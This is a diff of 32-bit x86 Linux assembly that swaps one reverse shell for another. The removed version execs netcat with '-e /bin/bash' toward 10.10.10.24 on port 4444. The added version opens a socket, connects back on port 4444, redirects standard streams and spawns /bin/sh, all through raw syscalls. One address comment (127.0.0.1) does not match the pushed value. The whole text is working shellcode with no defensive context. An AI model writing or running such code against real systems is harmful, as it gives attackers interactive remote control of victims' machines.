@@ -1,19 +1,57 @@
-section .data
-
-arg0    db "/bin/nc", 0
-arg1    db "10.10.10.24", 0
-arg2    db "4444", 0
-arg3    db "-e", 0
-arg4    db "/bin/bash", 0
-
-        align 4
-argv    dd arg0, arg1, arg2, arg3, arg4, 0
-envp    dd 0
 
 section .text
         global _start
-_start: mov eax, 11   ; SYS_execve
-        mov ebx, arg0 ; filanem
-        mov ecx, argv ; argv
-        mov edx, envp ; envp
-        int 0x80      ; syscall
+
+_start:
+_create_socket:
+        mov eax, 0x66 ; socketcall
+        mov ebx, 1  ; SYS_SOCKET
+        mov edx, 0
+        push edx
+        push ebx
+        push 0x2
+        mov ecx, esp
+        int 80h ; sys_socket
+        xchg edx, eax
+
+_connect:
+        mov eax, 0x66
+        push 0x0101017f ; 127.0.0.1
+        push word 0x5c11 ; 4444
+        mov ebx, 0x02
+        push word bx
+        mov ecx, esp
+        push 0x10
+        push ecx
+        push edx
+        mov ecx, esp
+        inc ebx
+        int 80h ; sys_connect
+
+        mov ecx, 2
+        xchg ebx, edx
+
+
+_redirect:
+        mov al, 0x3f
+        int 80h ; sys_dup2 for stdin, stdout then stderror
+        dec ecx
+        jns _redirect
+
+
+_launch:
+        mov al, 0x0b
+        mov ecx, 0
+        mov edx, 0
+        push 0x00
+        push 0x68732f2f ; "hs//"
+        push 0x6e69622f ; "nib/
+        mov ebx, esp
+        int 80h
+
+
+_exit:
+        mov eax, 1
+        mov ebx,  0
+        int 80h
+
